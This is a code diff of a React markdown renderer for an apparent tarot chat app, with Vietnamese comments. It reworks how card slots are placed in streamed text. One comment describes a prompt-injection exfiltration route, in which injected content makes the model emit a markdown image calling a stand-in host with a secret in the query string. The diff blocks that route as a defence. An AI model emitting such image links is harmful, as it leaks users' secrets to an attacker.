@@ -1,46 +1,48 @@
 import { memo, type ReactNode } from 'react'
-import { MarkdownTextPrimitive } from '@assistant-ui/react-markdown'
-import remarkGfm from 'remark-gfm'
+import { Markdown, type MarkdownComponents } from '@astryxdesign/core/Markdown'
+import type { DrawnCard } from '@db'
 import { CardFigure } from '../tarot/CardFigure'
-import { useMessageMeta } from './meta'
 import classes from './Markdown.module.css'
 
+/** Mã [[card:N]] nằm riêng một dòng là chỗ đặt lá thứ N. */
 const CARD_SLOT = /^[ \t]*\[\[card:(\d+)\]\][ \t]*$/gm
-const CARD_SRC = /^#card-(\d+)$/
+/** Mã chỉ gõ được nửa chừng trong lúc stream ("[[ca") thì ẩn đi cho tới khi đủ. */
+const PARTIAL_SLOT = /\[\[c?a?r?d?:?\d*\]?$/
+
+type Segment = { kind: 'text'; text: string } | { kind: 'card'; index: number }
 
 /**
- * Mã [[card:N]] nằm riêng một dòng là chỗ đặt lá thứ N. Đổi nó thành một ảnh
- * markdown trỏ tới "#card-N" để trình render markdown giữ đúng vị trí, rồi thay
- * ảnh đó bằng thẻ lá thật. Mã chỉ gõ được nửa chừng trong lúc stream ("[[ca")
- * thì ẩn đi cho tới khi đủ.
+ * Cắt bài đọc thành từng đoạn markdown xen giữa các lá. Mỗi đoạn là một
+ * <Markdown> riêng, lá là thẻ thật nằm giữa — không còn mẹo đổi mã thành ảnh
+ * rồi thay ảnh, và thẻ lá (<figure>) không bao giờ nằm trong <p>.
  */
-function preprocess(text: string): string {
-  return text.replace(CARD_SLOT, '\n![](#card-$1)\n').replace(/\[\[c?a?r?d?:?\d*\]?$/, '')
-}
-
-function CardSlot({ src }: { src?: string }) {
-  const { cards } = useMessageMeta()
-  const index = Number(src?.match(CARD_SRC)?.[1] ?? 0) - 1
-  const card = cards?.[index]
-  return card ? <CardFigure card={card} /> : null
+function split(text: string): Segment[] {
+  const source = text.replace(PARTIAL_SLOT, '')
+  const segments: Segment[] = []
+  let last = 0
+  for (const match of source.matchAll(CARD_SLOT)) {
+    const before = source.slice(last, match.index)
+    if (before.trim()) segments.push({ kind: 'text', text: before })
+    segments.push({ kind: 'card', index: Number(match[1]) - 1 })
+    last = match.index + match[0].length
+  }
+  const rest = source.slice(last)
+  if (rest.trim()) segments.push({ kind: 'text', text: rest })
+  return segments
 }
 
 /**
  * Hằng số cấp module, không tạo trong lúc render: mỗi object mới là một bộ
- * component mới, React dỡ và dựng lại cả cây markdown ở mỗi token — thẻ lá chạy
- * lại animation lật mãi nên gần như không bao giờ thấy được ảnh.
+ * component mới và cây markdown bị dựng lại ở mỗi mẩu chữ.
  */
-const COMPONENTS = {
-  // Thẻ lá là <figure>; nằm trong <p> là HTML sai, nên đoạn văn dùng <div>.
-  p: ({ children }: { children?: ReactNode }) => <div className={classes.paragraph}>{children}</div>,
-  // Chỉ ô đặt lá nội bộ. Ảnh ngoài là kênh rò dữ liệu: nội dung bị chèn lệnh vào
-  // model có thể viết ![](https://ke-la/?d=<bí mật>) và trình duyệt tự gửi đi khi
-  // hiện ảnh — không cần ai bấm gì.
-  img: ({ src, alt }: { src?: string | Blob; alt?: string }) =>
-    typeof src === 'string' && CARD_SRC.test(src) ? <CardSlot src={src} /> : alt ? <span>{alt}</span> : null,
+const COMPONENTS: MarkdownComponents = {
+  // Ảnh ngoài là kênh rò dữ liệu: nội dung bị chèn lệnh vào model có thể viết
+  // ![](https://ke-la/?d=<bí mật>) và trình duyệt tự gửi đi khi hiện ảnh —
+  // không cần ai bấm gì. Chỉ giữ chữ thay thế.
+  image: ({ alt }: { alt: string }) => (alt ? <span>{alt}</span> : null),
   // Link phải bấm mới đi, nhưng vẫn chỉ cho http(s) và không gửi referrer.
-  a: ({ href, children }: { href?: string; children?: ReactNode }) =>
-    href && /^https?:\/\//i.test(href) ? (
+  link: ({ href, children }: { href: string; children: ReactNode }) =>
+    /^https?:\/\//i.test(href) ? (
       <a href={href} target="_blank" rel="noopener noreferrer nofollow">
         {children}
       </a>
@@ -49,17 +51,37 @@ const COMPONENTS = {
     ),
 }
 
-const REMARK_PLUGINS = [remarkGfm]
-
-function MarkdownTextImpl() {
+function MarkdownTextImpl({
+  text,
+  cards,
+  streaming,
+}: {
+  text: string
+  cards: DrawnCard[] | null
+  streaming: boolean
+}) {
+  const segments = split(text)
   return (
-    <MarkdownTextPrimitive
-      className={classes.markdown}
-      remarkPlugins={REMARK_PLUGINS}
-      preprocess={preprocess}
-      smooth
-      components={COMPONENTS}
-    />
+    <div className={classes.markdown}>
+      {segments.map((segment, position) => {
+        if (segment.kind === 'card') {
+          const card = cards?.[segment.index]
+          return card ? <CardFigure key={`card-${position}`} card={card} /> : null
+        }
+        return (
+          <Markdown
+            key={`text-${position}`}
+            components={COMPONENTS}
+            contentWidth="100%"
+            headingLevelStart={2}
+            // Chỉ đoạn cuối còn đang chảy; các đoạn trước đã đứng yên.
+            isStreaming={streaming && position === segments.length - 1}
+          >
+            {segment.text}
+          </Markdown>
+        )
+      })}
+    </div>
   )
 }
 
